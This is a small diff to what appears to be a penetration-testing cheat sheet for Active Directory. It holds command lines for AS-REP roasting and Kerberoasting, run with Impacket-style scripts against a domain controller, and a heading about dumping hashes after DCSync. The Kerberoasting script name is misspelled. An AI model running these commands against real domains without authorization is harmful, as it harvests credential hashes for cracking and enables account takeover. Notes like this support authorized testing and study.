@@ -34,7 +34,9 @@ GetNPUsers:
 
 `sudo python3 GetNPUsers.py <Domain Controller>/ -dc-ip <IP> -request`
 
-Kerberoasting: `sudo python3 GetUsersSPNs.py <Domain Controller>/<Valid Username> -dc-ip <IP> -request`
+Kerberoasting
+
+GetUsersSPNs: `sudo python3 GetUsersSPNs.py <Domain Controller>/<Valid Username> -dc-ip <IP> -request`
 
 Hash Dump After DCSync
 
